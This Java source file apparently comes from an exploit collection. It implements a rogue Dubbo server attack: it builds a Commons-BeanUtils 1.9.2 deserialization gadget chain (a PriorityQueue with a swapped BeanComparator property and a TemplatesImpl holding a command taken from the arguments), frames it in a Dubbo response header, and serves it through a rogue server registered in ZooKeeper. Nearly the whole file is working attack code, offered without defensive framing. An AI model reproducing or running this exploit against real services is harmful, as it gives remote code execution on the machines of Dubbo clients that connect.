package com.threedr3am.bug.dubbo.rouge.java;

import com.threedr3am.bug.common.utils.Reflections;
import com.threedr3am.bug.dubbo.rouge.RougeBase;
import com.threedr3am.bug.dubbo.utils.Gadgets;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.math.BigInteger;
import java.util.PriorityQueue;
import java.util.Random;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.dubbo.common.io.Bytes;

/**
 * commons-beanutils:commons-beanutils:1.9.2
 */
public class CommonsBeanUtils extends RougeBase {

    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(args[0]);
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        ByteArrayOutputStream jserial2ByteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(jserial2ByteArrayOutputStream);
        objectOutputStream.writeByte(1);
        objectOutputStream.writeObject(queue);
        objectOutputStream.flush();
        objectOutputStream.close();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set response event and serialization flag.
        header[2] = (byte) ((byte) 0x20 | 3);
        header[3] = 20;

        // set response id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        Bytes.int2bytes(jserial2ByteArrayOutputStream.size(), header, 12);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(jserial2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        String zookeeperUri = "127.0.0.1:2181";
        String rougeHost = "127.0.0.1";
        int rougePort = 33336;

        new CommonsBeanUtils().startRougeServer(zookeeperUri, rougeHost, rougePort, bytes, true);
    }

    @Override
    public String getType() {
        return "java";
    }

}
